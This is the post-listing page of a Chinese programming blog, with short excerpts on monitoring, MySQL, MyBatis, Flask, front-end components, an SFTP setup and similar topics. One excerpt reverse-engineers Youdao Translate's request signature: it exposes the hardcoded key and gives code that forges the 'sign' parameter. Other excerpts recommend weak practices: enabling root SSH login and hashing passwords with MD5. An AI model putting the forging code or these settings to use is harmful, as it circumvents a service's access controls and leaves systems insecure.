<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fcdab310ba8b641f72da20eb3f61e856/" rel="bookmark">
			一阶微分算子和二阶微分算子
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 转载：
CV笔记6：图像边缘检测之一阶微分算子、二阶微分算子、Canny边缘检测(基于python-opencv实现)Laplacian算子-Log算子-Dog算子边缘检测原理合集及实现DoG和LoG算子斑点检测(LoG,DoG) [上]斑点检测(LoG,DoG)(下)CS131专题-6：图像特征（Blob检测、LoG算子、Harris-Laplacian） 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/392e4fb9916fd0ede38225ed62ad4d53/" rel="bookmark">
			Prometheus安装与部署
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Prometheus简介 Prometheus受启发于Google的Brogmon监控系统（相似的Kubernetes是从Google的Brog系统演变而来），从 2012 年开始由前Google工程师在Soundcloud 以开源软件的 形式进行研发，并且于 2015 年早期对外发布早期版本。Prometheus具有以下特点：易于管理、监控服务的内部运行状态、强大的数据模型、所有采集的监控数据均以指标(metric)的形式保存在内置的时间序列数据库当中(TSDB)。最新的Grafana可视化工具也已经提供了完整的Prometheus支持，基于Grafana可以创建更加精美的监控图标。
Prometheus架构 1、Prometheus 生态圈组件 Prometheus Server：主服务器，负责收集和存储时间序列数据 client libraies：应用程序代码插桩，将监控指标嵌入到被监控应用程序中 Pushgateway：推送网关， 为支持 short-lived 作业提供一个推送网关 exporter：专门为一些应用开发的数据摄取组件—exporter，例如： HAProxy、 StatsD、Graphite 等等。 Alertmanager：专门用于处理 alert 的组件 2、架构理解 Prometheus Server，里面包含了存储引擎和计算引擎。 Retrieval 组件为取数组件，它会主动从 Pushgateway 或者 Exporter 拉取指标数据。 Service discovery，可以动态发现要监控的目标。 TSDB，数据核心存储与查询。 HTTP server，对外提供 HTTP 服务。 3、采集层 采集层分为两类，一类是生命周期较短的作业，还有一类是生命周期较长的作业。 短作业：直接通过 API，在退出时间指标推送给 Pushgateway。 长作业：Retrieval 组件直接从 Job 或者 Exporter 拉取数据。 4、应用层 应用层主要分为两种，一种是 AlertManager，另一种是数据可视化。 集群规划 IP
服务
hostname
192.168.255.101
Prometheus Server、Pushgateway、Alertmanager、Node Exporter
node01
192.168.255.102
Node Exporter
node02
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/392e4fb9916fd0ede38225ed62ad4d53/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5edf3b28089b84de9dcca508ec430678/" rel="bookmark">
			mysql: [Warning] Using a password on the command line interface can be insecure.
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 最近在写shell脚本，需要查询mysql，然后运行脚本提示了这个，虽然想查询的内容确实查询到了，但是这个警告直接让脚本的级别变成了Error!
这个警告的意思是说在命令行直接使用密码是不安全的。
解决办法：
2&gt;/dev/null 在命令末尾添加2&gt;/dev/null是将标准错误输出重定向到空设备文件，即将错误信息丢弃。这样做的目的是隐藏可能由于权限问题或其他原因导致的错误消息，只显示命令的输出结果。
甩个例子：
mysql -u $MYSQL_USER -p$MYSQL_PASSWORD -e "CREATE DATABASE $MYSQL_DATABASE_NAME;" 2&gt;/dev/null 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cbfeb3201746a8218efe7648cac85b21/" rel="bookmark">
			How to modify the value of PS1 variable in command line prompt in Centos?
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近一段时间在使用CentOS 7.x的时候，有很多地方感觉没有Ubuntu好用，尤其是命令提示符PS1，这里就特意介绍一下如何修改。
编辑配置文件/etc/bashrc
[root@lanzhou ~]# cat /etc/bashrc # /etc/bashrc # System wide functions and aliases # Environment stuff goes in /etc/profile # It's NOT a good idea to change this file unless you know what you # are doing. It's much better to create a custom.sh shell script in # /etc/profile.d/ to make custom changes to your environment, as this # will prevent the need for merging in future updates.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cbfeb3201746a8218efe7648cac85b21/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3b894f775927bd5b674b6253c6a17b7a/" rel="bookmark">
			银行笔试篇---职业能力测试（行测）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		数字推理 数字推理可分为等差数列、等比数列、和数列、积数列、幂数列以及分数数列六类，做题时的总体原则为：
关键点1：凡是一次变化找不到规律的，直接放弃！所谓一次变化指的是：1.通过一次相邻两数作差、作和、作商、作积得到的新数列是基本数列；2.通过取相邻两数的一个多项式表达得到第三个数
关键点2：如果数列只给了4个，那么递推关系就不会涉及3个
每个类型有着一定的鲜明特征，我们绘制了一个思维导图来体现数字推理流程
图形推理 图形推理按照涉及类别可分成：图形构成、几何形状、图形转化三部分，我总结了从题目入手时，怎么确定图形推理应采用哪一模式：
而在谈到具体的题目类型时，又可以根据展示规则方式的不同，分为：
类比性图形推理（给出两组共五图，根据一组推二组）顺推型图形推理（给出连续五张图，推理第六张）九宫格型图形推理（按行或按列出现规则，推测第九张）空间型图形推理（给定三视图推三维图，或给定三维图推三视）分类型图形推理（从答案开始分析，以某一个图着手确定分组方式） 逻辑推理 我绘制了一幅思维导图来概括了逻辑推理的要点：
定义判断 定义判断只需要记住一个黄金口诀就行：
找到定义的主体与客体，并分析主体与客体的作用关系以及特征
定义判断的题目大多为给出一段定义，然后要求从选项中选出符合定义的行为，因此利用黄金口诀可以解决绝大多数问题
类比推理 类比推理的黄金口诀有二
将例子的词组连成一句话，提现互连关系，然后从选项中找出可以在这段话中完成替换的词组口诀1不成立时，从每个词的特征入手进行分析，例如是否是偏正词 思维策略 同样，我总结了一个思维导图：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4e2c6c30b556f87872d3c612bac86f7d/" rel="bookmark">
			Python Flask解析jQuery DataTables发送的ajax请求参数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		背景 前端使用jQuery DataTables控件向后端发起ajax请求，后端使用Flask框架解析请求参数遇到的问题。请求参数如下图：
后端获取参数 from flask import Flask, request print request.query_string 'draw=1&amp;columns%5B0%5D%5Bdata%5D=name&amp;columns%5B0%5D%5Bname%5D=&amp;columns%5B0%5D%5Bsearchable%5D=true&amp;columns%5B0%5D%5Borderable%5D=true&amp;columns%5B0%5D%5Bsearch%5D%5Bvalue%5D=&amp;columns%5B0%5D%5Bsearch%5D%5Bregex%5D=false&amp;columns%5B1%5D%5Bdata%5D=position&amp;columns%5B1%5D%5Bname%5D=&amp;columns%5B1%5D%5Bsearchable%5D=true&amp;columns%5B1%5D%5Borderable%5D=true&amp;columns%5B1%5D%5Bsearch%5D%5Bvalue%5D=&amp;columns%5B1%5D%5Bsearch%5D%5Bregex%5D=false&amp;columns%5B2%5D%5Bdata%5D=office&amp;columns%5B2%5D%5Bname%5D=&amp;columns%5B2%5D%5Bsearchable%5D=true&amp;columns%5B2%5D%5Borderable%5D=true&amp;columns%5B2%5D%5Bsearch%5D%5Bvalue%5D=&amp;columns%5B2%5D%5Bsearch%5D%5Bregex%5D=false&amp;columns%5B3%5D%5Bdata%5D=age&amp;columns%5B3%5D%5Bname%5D=&amp;columns%5B3%5D%5Bsearchable%5D=true&amp;columns%5B3%5D%5Borderable%5D=true&amp;columns%5B3%5D%5Bsearch%5D%5Bvalue%5D=&amp;columns%5B3%5D%5Bsearch%5D%5Bregex%5D=false&amp;columns%5B4%5D%5Bdata%5D=start_date&amp;columns%5B4%5D%5Bname%5D=&amp;columns%5B4%5D%5Bsearchable%5D=true&amp;columns%5B4%5D%5Borderable%5D=true&amp;columns%5B4%5D%5Bsearch%5D%5Bvalue%5D=&amp;columns%5B4%5D%5Bsearch%5D%5Bregex%5D=false&amp;columns%5B5%5D%5Bdata%5D=salary&amp;columns%5B5%5D%5Bname%5D=&amp;columns%5B5%5D%5Bsearchable%5D=true&amp;columns%5B5%5D%5Borderable%5D=true&amp;columns%5B5%5D%5Bsearch%5D%5Bvalue%5D=&amp;columns%5B5%5D%5Bsearch%5D%5Bregex%5D=false&amp;order%5B0%5D%5Bcolumn%5D=0&amp;order%5B0%5D%5Bdir%5D=asc&amp;start=0&amp;length=20&amp;search%5Bvalue%5D=&amp;search%5Bregex%5D=false&amp;name=%E5%BC%A0%E4%B8%89&amp;_=1694594130375' print request.values CombinedMultiDict([ImmutableMultiDict([('draw', u'1'), ('columns[0][data]', u'name'), ('columns[1][name]', u''), ('columns[5][searchable]', u'true'), ('columns[5][name]', u''), ('columns[4][search][regex]', u'false'), ('columns[1][orderable]', u'true'), ('columns[4][orderable]', u'true'), ('columns[5][orderable]', u'true'), ('columns[2][orderable]', u'true'), ('columns[4][name]', u''), ('order[0][dir]', u'asc'), ('columns[1][search][regex]', u'false'), ('columns[3][name]', u''), ('columns[0][search][value]', u''), ('columns[2][searchable]', u'true'), ('columns[3][search][regex]', u'false'), ('columns[0][search][regex]', u'false'), ('columns[5][data]', u'salary'), ('start', u'0'), ('columns[4][searchable]', u'true'), ('columns[0][searchable]', u'true'), ('columns[5][search][value]', u''), ('columns[3][searchable]', u'true'), ('columns[2][search][value]', u''), ('columns[2][search][regex]', u'false'), ('columns[1][data]', u'position'), ('columns[1][searchable]', u'true'), ('columns[5][search][regex]', u'false'), ('columns[0][orderable]', u'true'), ('columns[4][data]', u'start_date'), ('columns[0][name]', u''), ('columns[2][data]', u'office'), ('columns[3][data]', u'age'), ('search[value]', u''), ('columns[3][orderable]', u'true'), ('_', u'1694594130375'), ('columns[4][search][value]', u''), ('name', u'\u5f20\u4e09'), ('search[regex]', u'false'), ('columns[1][search][value]', u''), ('order[0][column]', u'0'), ('columns[2][name]', u''), ('length', u'20'), ('columns[3][search][value]', u'')]), ImmutableMultiDict([])]) print request.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4e2c6c30b556f87872d3c612bac86f7d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f152355caea2838b05af46ee99890ef9/" rel="bookmark">
			Element UI 中使用el-cascader组件，可以选择任意一级的内容并取消单选框
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 在Element UI中使用级联选择器,并且设置可以选择任意一级的内容 &lt;el-cascader v-model="selectedKeys" &lt;!-- options 指定数据源 --&gt; :options="options" &lt;!-- 悬浮级类上自动展开 --&gt; :expand-trigger="'hover'" style="width:100%" &lt;!-- 父级分类选择项发生后触发函数 --&gt; @change="change" &lt;!-- 是否支持清空选项 --&gt; clearable &lt;!-- checkStrictly可以选择任意一级的内容 --&gt; :props="{ checkStrictly: true }"&gt; &lt;/el-cascader&gt; 解决方案： 当加入checkStrictly后就会出现单选框的问题，修改样式即可；这里使用的less语法，需要有less依赖，加入样式后如果没有生效，可以放在App.vue中的样式下
&lt;style lang="less"&gt; .el-cascader-panel .el-radio { width: 100%; height: 100%; z-index: 10; position: absolute; top: 10px; right: 10px; } .el-cascader-panel .el-radio__input { visibility: hidden; } .el-cascader-panel .el-cascader-node__postfix { top: 10px; } &lt;/style&gt; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8672c91c3c3851409d726cb203023d2e/" rel="bookmark">
			逆向生成crud增删改查代码方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		逆向生成crud增删改查代码方案 一、方案一：mybatis逆向生成二、方案二：tk.mybatis 一、方案一：mybatis逆向生成 1、新建逆向工程，并在pom.xml中加入以下依赖：
&lt;!-- 依赖MyBatis核心包 --&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis&lt;/artifactId&gt; &lt;version&gt;3.5.7&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;!-- 控制Maven在构建过程中相关配置 --&gt; &lt;build&gt; &lt;!-- 构建过程中用到的插件 --&gt; &lt;plugins&gt; &lt;!-- 具体插件，逆向工程的操作是以构建过程中插件形式出现的 --&gt; &lt;plugin&gt; &lt;groupId&gt;org.mybatis.generator&lt;/groupId&gt; &lt;artifactId&gt;mybatis-generator-maven-plugin&lt;/artifactId&gt; &lt;version&gt;1.3.0&lt;/version&gt; &lt;!-- 插件的依赖 --&gt; &lt;dependencies&gt; &lt;!-- 逆向工程的核心依赖 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.generator&lt;/groupId&gt; &lt;artifactId&gt;mybatis-generator-core&lt;/artifactId&gt; &lt;version&gt;1.3.2&lt;/version&gt; &lt;/dependency&gt; &lt;!-- 数据库连接池 --&gt; &lt;dependency&gt; &lt;groupId&gt;com.mchange&lt;/groupId&gt; &lt;artifactId&gt;c3p0&lt;/artifactId&gt; &lt;version&gt;0.9.2&lt;/version&gt; &lt;/dependency&gt; &lt;!-- MySQL驱动 --&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.8&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; 2、新建配置xml在resources资源文件夹下创建
generatorConfig.xml内容如下：
&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;!DOCTYPE generatorConfiguration PUBLIC "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8672c91c3c3851409d726cb203023d2e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/63ae6e6c67f6589ea7efff93c2cf3181/" rel="bookmark">
			USB接口针式打印机
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 针式打印机原理
- 针式打印机16针是纵向排列，每次打印垂直的16bit，然后右移一bit，继续下列打印；字节的MSB表示最上面的点，字节LSB表示最下面的点
- 由于汉字字模的点阵是横向排列的，而提供给打印头的信息却需要按纵向排列，所以必须再对字模缓冲区中存放的字模数据进行变换，变成打印机按图形方式工作时所需要的数据格式才能送出
- 参考Nokia5110和JLX12864的字符显示原理
Figure 1-1 针式打印机纵向排列点阵字模
Figure 1-2 针式打印机打印头运动方向
2 点阵取模原理之横向取模与纵向取模
浅谈LCD、OLED、TFT取模及其程序开发的算法取舍
https://blog.csdn.net/yagnruinihao/article/details/47133455
基于LPC1768的EPSON M-150II针式打印头控制板设计
https://www.cnblogs.com/lewismotion/p/11001998.html
3 针式打印机控制命令
- EPSON ESC
- OKI
- IBM
- Italy Olivetti，南天打印机
4 打印机机芯
4.1 热敏打印机机芯
FTP-628 MCL101：FUJITSU Component Thermal Printer FTP-608 Series
5 主控
APM32：APEXMIC，纳思达
6 Abbreviations
ESC：打印控制命令，EPSON Standard Code for Printer
USB BH reset：Bigger Hammer or Brad Hosler，表示warm reset；you may be confused why the USB 3.0 spec calls the same type of reset "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/63ae6e6c67f6589ea7efff93c2cf3181/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e7ce0593d43e2426b22e3ed2a79564d8/" rel="bookmark">
			java常见的密码加密方式Sha256,MD5
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 java对密码常见的加密方式：
一、MD5
String password="123456"; String salt = StaticConstant.SALT; new SimpleHash("MD5", password, salt, 1024).toHex() 二、Sha256
public static String getSha256(String str) { MessageDigest messageDigest = null; String encodeStr = ""; try { messageDigest = MessageDigest.getInstance("SHA-256"); messageDigest.update(str.getBytes("UTF-8")); encodeStr = byte2Hex(messageDigest.digest()); } catch (Exception e) { System.out.println(e.getMessage()); } return encodeStr; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/74ec17accd410cf3d34fa4c1c05de8e5/" rel="bookmark">
			python怎么读取csv文件？下面两种方法四行代码就能解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		csv文件是一种以逗号分隔数据的文件类型，常用于存储纯文本类型的数据，在数据库和电子表格内它是非常常见的一种导入导出格式。那么如何在python中读取csv文件呢？下面文章会有python读取csv文件的相关方法介绍。
一、csv内置库
最简单的在python中读取csv文件的方法就是用csv内置库的方法打开文件后用for循环逐行输出了，方法如下：
import csv
这行代码的意思是在当前文件引入csv标准库。
csvfile = csv.reader(open(＇python.csv＇))
使用reader方法打开名为python.csv的文件
for info in csvfile \n print info
使用for循环将打开的csvfile文件逐行输出。
二、pandas库读取
pandas库是python众多标准库和第三方库中功能非常强大的数据分析和数据处理库，使用pandas库来读取csv会更简单。
import pandas as pd
导入import模块声明为pd。
datacsv = pd.read_csv(＇python.csv＇)
使用read_csv方法将文件内的数据取出来放在变量中。
datacsv = pd.read_table(＇python.csv＇, ＇，＇)
将文件内的所有数据全部按照逗号进行分隔。
print datacsv
输出分隔后的变量，输出的结果应该是以逗号分隔排列的数据。
以上就是关于python怎么读取csv文件的两种简单使用的方法啦
关于Python技术储备
学好 Python 不论是就业还是做副业赚钱都不错，但要学会 Python 还是要有一个学习规划。最后大家分享一份全套的 Python 学习资料，给那些想学习 Python 的小伙伴们一点帮助！
一、Python所有方向的学习路线
Python所有方向的技术点做的整理，形成各个领域的知识点汇总，它的用处就在于，你可以按照上面的知识点去找对应的学习资源，保证自己学得较为全面。
二、Python必备开发工具
三、Python视频合集
观看零基础学习视频，看视频学习是最快捷也是最有效果的方式，跟着视频中老师的思路，从基础到深入，还是很容易入门的。
四、实战案例
光学理论是没用的，要学会跟着一起敲，要动手实操，才能将自己的所学运用到实际当中去，这时候可以搞点实战案例来学习。
五、Python练习题
检查学习结果。
六、面试资料
我们学习Python必然是为了找到高薪的工作，下面这些面试题是来自阿里、腾讯、字节等一线互联网大厂最新的面试资料，并且有阿里大佬给出了权威的解答，刷完这一套面试资料相信大家都能找到满意的工作。
最后祝大家天天进步！！
上面这份完整版的Python全套学习资料已经上传至CSDN官方，朋友如果需要可以直接微信扫描下方CSDN官方认证二维码免费领取【保证100%免费】。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eb8e8d1958adc8a2a48117ecb8648f3c/" rel="bookmark">
			git解决ssh: Could not resolve hostname gitlab.xxxx.com
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 报错:ssh: Could not resolve hostname gitlab.xxxx.com: Name or service not known
fatal: Could not read from remote repository.
解决如下:
a:sudo vi /etc/hosts 添加如下: b:设置为 IP地址 gitlab.xxxx.com 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/09d4ae91930ef27bf897795e65a5c880/" rel="bookmark">
			UDS详解（三）——物理寻址和功能寻址
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		总线上往往有多个ECU，诊断设备可以和某一个ECU进行通信，也可以和多个ECU通信，方式就是把寻址方式分为功能寻址和物理寻址，寻址指的是消息传输的方式。
诊断报文通常有3个诊断ID：物理请求报文ID，功能请求报文ID和诊断响应ID。物理请求报文ID对应物理寻址，是诊断仪和ECU之间点对点通信；功能请求报文ID对应功能寻址，属于一对多通信。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d5c25238725d4b0a3da8d4ddb1fdd61b/" rel="bookmark">
			linux上搭建sftp服务器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 第一步：查看ssh版本第二步：添加sftp用户组第三步：创建sftp用户并设置密码第四步：设置活动目录第五步：配置chroot目录权限第六步：指定sftp组用户sftp_upload的home目录第七步：修改ssh配置文件第八步：新建上传目录第九步：重启sshd服务第十步：测试连接 第一步：查看ssh版本 [root@localhost /]# ssh -V OpenSSH_7.4p1, OpenSSL 1.0.2k-fips 26 Jan 2017 第二步：添加sftp用户组 ​ 创建一个用户组，组名是sftp
[root@localhost /]# groupadd sftp 第三步：创建sftp用户并设置密码 ​ 创建一个用户，用户名sftp_upload归属于sftp用户组
[root@localhost /]# useradd -g sftp -s /bin/false sftp_upload ​ -s /bin/false：不允许shell登录。 -g sftp：加入sftp组
[root@localhost /]# passwd sftp_upload 第四步：设置活动目录 [root@localhost /]# mkdir /upload/sftp_upload 第五步：配置chroot目录权限 [root@localhost /]# chown root:sftp /upload/sftp_upload [root@localhost /]# chmod 755 /upload/sftp_upload **注意：**此目录如果用于后续的 chroot 的活动目录，目录所有者必须是 root
第六步：指定sftp组用户sftp_upload的home目录 [root@localhost /]# usermod -d /upload/sftp_upload sftp_upload 第七步：修改ssh配置文件 [root@localhost /]# vi /etc/ssh/sshd_config # 开启验证 PasswordAuthentication yes # 禁止空密码登录 PermitEmptyPasswords no # 开启远程登录 PermitRootLogin yes #在文件末尾增加下面内容 Subsystem sftp internal-sftp Match Group sftp X11Forwarding no AllowTcpForwarding no ChrootDirectory %h ForceCommand internal-sftp 第八步：新建上传目录 ​ 新建一个目录供sftp用户sftp_upload上传文件。 这个目录所有者为sftp_upload，所有组为sftp，所有者有写入权限，所有组无写入权限。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d5c25238725d4b0a3da8d4ddb1fdd61b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3b9495bb431bcac721a2d714a108cebe/" rel="bookmark">
			如何解决 “Component cannot be used as a JSX component“
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 原因是react版本与@types/react版本不一致导致的,
在tsconfig.json中加入以下代码,将依赖指向项目里的node_modules
"paths": { "react": [ "./node_modules/@types/react" ] } 改完后代码大概是长这样的
{ "compilerOptions": { ... "paths": { "@/*": [ "src/*" ], "@pages/*": [ "src/pages/*" ], "react": [ "./node_modules/@types/react" ] } ... } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/389dd55bb6a0e11a2773fc9a54238cc9/" rel="bookmark">
			使用xlsx.js将表格中的数据导出为excel
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		先导入xlsx.js，github仓库在下面
https://github.com/SheetJS/sheetjs
测试用的jsp如下
&lt;%@ page contentType="text/html;charset=UTF-8" language="java" %&gt; &lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;项目信息浏览&lt;/title&gt; &lt;!-- Meta tag Keywords --&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt; &lt;meta charset="UTF-8" /&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;!-- Custom-Files --&gt; &lt;!-- //Custom-Files --&gt; &lt;script src="xlsx.js"&gt;&lt;/script&gt; &lt;!-- 注意：如果你直接复制所有代码到本地，上述js路径需要改成你本地的 --&gt; &lt;script&gt; function btn_export() { var table1 = document.querySelector("#table1"); var sheet = XLSX.utils.table_to_sheet(table1);//将一个table对象转换成一个sheet对象 openDownloadDialog(sheet2blob(sheet),'下载.xlsx'); } // 将一个sheet转成最终的excel文件的blob对象，然后利用URL.createObjectURL下载 function sheet2blob(sheet, sheetName) { sheetName = sheetName || 'sheet1'; var workbook = { SheetNames: [sheetName], Sheets: {} }; workbook.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/389dd55bb6a0e11a2773fc9a54238cc9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/777764d5f770e16820cf5b55522ff627/" rel="bookmark">
			uniapp H5 navigateBack无法返回上一层级
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 项目场景：
提交表单后需要返回上一级
原因分析：
H5在PC端打开，当前页面重新加载的情况下，出现navigateBack不能返回，由于H5端页面刷新后返回页面栈会消失
//提交 const handleSubmit = async () =&gt; { form.value?.assignId ? await putObj(form.value) : await addObj(form.value); uni.showToast({ title: form.value?.assignId ? "修改成功" : "新建成功", icon: "none", }); // uni.navigateBack({}); 失效 history.back();//back() 方法可加载历史列表中的前一个 URL（如果存在）。 }; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d63fba86ceec6255b46aa136790f5bea/" rel="bookmark">
			js逆向-有道翻译sign参数逆向
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天逆向的网站：aHR0cHM6Ly9mYW55aS55b3VkYW8uY29tL2luZGV4Lmh0bWwjLw==
（去在线网站进行base64解密即可）
1、点击翻译，触发请求 可以看到sign参数加密，加密长度为32为
md5加密特征：
**长度固定。**无论输入的数据长度是多少字节，输出总32位字符。**不可逆。**即无法通过MD5值反推出原始数据。**抗修改性。**对原始数据进行的任何改动，甚至是一个字节的修改，都会导致MD5值显著不同。**抗碰撞性。**要找到两个具有相同MD5值的不同数据非常困难。 由此我们可以判断，它属于md5加密
2、输入快捷键ctrl+shift+f 打开全局搜索 搜索被加密参数sign： 3、我们点击第一个js文件 ，进入内部,可以看到sign:h(t,e) 4、给sign:h(t,e)这行代码加上断点，点击翻译触发断点 5、控制台输出参数t和e 可以看到参数t类似时间戳，参数e是一个字符串，经过笔者验证，e为固定字符串
t=(new Date).getTime(); 获取时间戳的方法
6、进入h方法内部 进入h方法内部-鼠标放在h方法，点击蓝色字符那里，点击即可进入h方法内部
7、我们给h方法加上断点 8、执行h方法 可以看到使用g进行加密：
g(`client=${d}&amp;mysticTime=${e}&amp;product=${u}&amp;key=${t}`)
类似于python的格式化字符串传参，传入了参数d和e和u和t
分别看看他们的数据结果是什么：
//时间戳 变化 e=(new Date).getTime(); //固定参数 t='fsdsogkndfokasodnaso' d='fanyideskweb' u='webfanyi' 得出结论：
使用g方法对这个字符串（d，t，u，t）进行加密：`client=${d}&amp;mysticTime=${e}&amp;product=${u}&amp;key=${t}`
结果：
'client=fanyideskweb&amp;mysticTime=1687839695433&amp;product=webfanyi&amp;key=fsdsogkndfokasodnaso'
最后使用g方法对进行加密
7、猜测加密方法 我们刚才大概猜测到加密方法为md5,我们使用g方法加密字符串'1'的结果：
8、验证是否属于标准加密 我们对比标准加密算法，对字符串'1'进行加密是否和g方法的加密结果是否一致：
可以看到，标准加密的结果和g方法是一致的，由此，g属于标准加密，
9、实现加密逻辑 我们使用js标准加密算法库（crypto-js）进行加密
可以看到我们使用js标准库加密和逆向的网站的结果是一样的
js逆向代码（sign参数）：
Crypto=require('crypto-js') function h(e, t) { d='fanyideskweb' u='webfanyi' //格式化字符串 最后转为字符串 return Crypto.MD5(`client=${d}&amp;mysticTime=${e}&amp;product=${u}&amp;key=${t}`).toString() } //传入e（时间戳）和t参数 //时间戳 e=(new Date).getTime(); //固定参数 t='fsdsogkndfokasodnaso' //调用h方法，入e（时间戳）和t参数 console.log(h(e, t)); 今天的教程就到这里，有帮助记得点赞！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6a8ef6b1b28c37c83507a2aa257c5a82/" rel="bookmark">
			idea配置注释模板
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、类的模板
设置里面依次找到图中标注的地方
填入
/** ${describe} @author 填入你的名字 @date ${YEAR}-${MONTH}-${DAY} ${TIME} @version 1.0.0 */ 配置完成后，新创建的类就会自动生成类开头的注释
Ps：如果你生成注释describe后面会自动添加空行，
在file&gt;setting&gt;Editor&gt;Code Style&gt;Java&gt;JavaDoc&gt;Blank Lines-&gt;After description 去掉前面的勾选
（此操作可能会导致注释无法生成，如果无法生成撤销此项操作）
二、方法的注释模板
如图创建模板
步骤6中填入
